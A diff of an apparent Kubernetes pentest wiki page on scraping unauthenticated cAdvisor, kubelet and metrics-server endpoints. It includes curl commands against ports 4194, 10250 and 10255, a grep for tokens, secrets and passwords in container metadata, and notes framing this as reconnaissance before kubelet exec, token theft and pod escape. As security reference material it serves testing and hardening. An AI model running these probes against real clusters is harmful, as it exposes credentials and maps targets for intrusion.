@@ -1,31 +1,45 @@
 ---
-title: "cAdvisor and metrics: harvesting container and node telemetry"
-description: "Scraping cAdvisor, metrics-server, and node metrics endpoints that are exposed without authentication to inventory containers, processes, and resource usage across nodes, and to recover command lines and labels that leak secrets and map high-value workloads."
+title: "cAdvisor and metrics: environment and topology leaks from stats endpoints"
+description: "cAdvisor and the various metrics endpoints expose per-container statistics and metadata. Where reachable without authentication, they leak container names, images, labels, and sometimes environment variables and command lines, giving an attacker a map of the cluster's workloads and occasionally secrets passed as container arguments or environment."
 keywords:
-  - cAdvisor
-  - metrics-server
-  - 4194
-  - kubernetes telemetry
-  - reconnaissance
+  - cadvisor
+  - metrics
+  - port 4194
+  - container stats
+  - information disclosure
 ---
 
 # cAdvisor and metrics
 
-Telemetry endpoints are reconnaissance gold. cAdvisor (historically on `4194`, and proxied by the kubelet) and metrics endpoints expose per-container detail: images, labels, command lines, and resource usage across the node or cluster. They rarely allow code execution, but they map the environment and often leak secrets in process arguments.
+cAdvisor collects resource statistics for every container and historically served them on port 4194; the kubelet also exposes `/metrics`, `/metrics/cadvisor`, and `/stats` endpoints, and clusters run metrics-server and Prometheus exporters. These are monitoring surfaces, but when reachable without authentication they disclose a detailed map of what runs where: container names, images, pod and namespace labels, and resource usage. Some expose container command lines and environment, which can include secrets passed as arguments or variables.
+
+Probe the endpoints:
 
 ```bash
-curl -sk https://<node>:10250/metrics/cadvisor | head
-curl -s http://<node>:4194/api/v1.3/subcontainers | jq '.[].spec.labels'   # legacy cAdvisor
-kubectl get --raw /apis/metrics.k8s.io/v1beta1/pods                         # metrics-server
+# legacy cAdvisor UI/API
+curl -s http://<node>:4194/api/v1.3/containers/ | python3 -m json.tool | head -60
+# kubelet-exposed cAdvisor metrics (via read-only port or the kubelet)
+curl -s http://<node>:10255/metrics/cadvisor | head
+curl -s http://<node>:10255/stats/summary | python3 -m json.tool | head
+```
+
+## What leaks
+
+```bash
+# container specs include labels, images, and sometimes env/args
+curl -s http://<node>:4194/api/v1.3/containers/ | \
+  grep -iE 'image|namespace|env|argv|TOKEN|SECRET|PASSWORD'
+# the topology alone maps every workload, aiding target selection
 ```
 
 ## Exploitation notes
 
-- Container labels and command lines frequently embed tokens, connection strings, and flags that name the next target.
-- The inventory identifies privileged and high-value pods to focus on for [Kubelet API](kubelet-api.md) exec or token theft.
-- These endpoints are read-only; treat them as a quiet mapping step before acting.
+- Treat these as reconnaissance: they rarely give execution, but they reveal the full workload inventory (images, namespaces, labels), which guides where to aim the RBAC and pod-escape routes.
+- Environment variables or command-line arguments surfaced in container metadata occasionally contain credentials passed insecurely; grep the dumps for secret-like strings.
+- These endpoints are often left open on the node network even when the main APIs are locked down, so they are a useful low-friction first look at an otherwise hardened cluster.
 
 ## References
 
 - [cAdvisor](https://github.com/google/cadvisor)
-- [Kubernetes: resource metrics pipeline](https://kubernetes.io/docs/tasks/debug/debug-cluster/resource-metrics-pipeline/)
+- [Kubernetes: kubelet metrics endpoints](https://kubernetes.io/docs/reference/instrumentation/metrics/)
+- [kube-hunter: cAdvisor](https://aquasecurity.github.io/kube-hunter/)
